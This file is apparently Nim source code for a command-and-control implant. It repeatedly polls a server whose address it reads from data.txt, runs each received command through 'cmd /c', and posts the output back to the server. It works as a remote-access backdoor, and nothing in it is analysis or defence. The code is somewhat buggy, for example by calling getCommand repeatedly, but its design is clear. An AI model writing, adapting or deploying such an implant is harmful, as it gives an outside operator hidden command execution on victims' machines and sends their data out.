import osproc
import std/[httpclient, json]
import strutils
import os
import net
var state = "sleep"
var client = newHttpClient()
const id = 1
var sleepcheck = false
let ip = readFile("data.txt")

proc runCommand(command: string):string =
  let (output, _) = execCmdEx("cmd /c $1" % [$command])
  echo output
  return output

  

proc getCommand(): string =
  let id = 1
  try:
    let output: string = client.getContent("http://$1:8000/get/$2" % [$ip,$id])
    echo output
    return output
  except:
    echo "can't get command"
  finally:
    client.close()
  

proc sendOutput(input: string) =
  client.headers = newHttpHeaders({ "Content-Type": "application/json" })
  let body = %*{
      "command": "$1" % [$input],
      "id": "$1" % [$id]
  }
  try:
    let response = client.request("http://$1:8000/set" % [$ip], httpMethod = HttpPost, body = $body)
  except:
    echo "can't send command"

proc main() =
  while true:
    if state == "sleep":
      echo "state sleep"
      if getCommand() != "":
        sendOutput(runCommand(getCommand()))
        echo "Here"
        sleep(30000)
        if getCommand() != "":
          sendOutput(runCommand(getCommand()))
          echo "Here2"
          state = "awake"
          echo "Awake"
          sleep(30000)
      sleep(60000)
    elif state == "awake":
      echo "Awake"
      if getCommand() != "":
        sendOutput(runCommand(getCommand()))
        echo "Here3"
        sleep(30000)
        if getCommand() != "":
          sendOutput(runCommand(getCommand()))
          echo "Here4"
          sleep(30000)
        else:
          echo "state sleep"
          state = "sleep"

proc main2() =
  while true:
    if state == "awake":
      for i in 0 .. 5:
        if sleepcheck == true:
          state = "sleep"
        else:
          if getCommand() != "":
            sendOutput(runCommand(getCommand()))
            echo "Here"
            sleep(30000)
          else:
            sleepcheck = true
    if state == "sleep":
      echo "hi"
      
main2()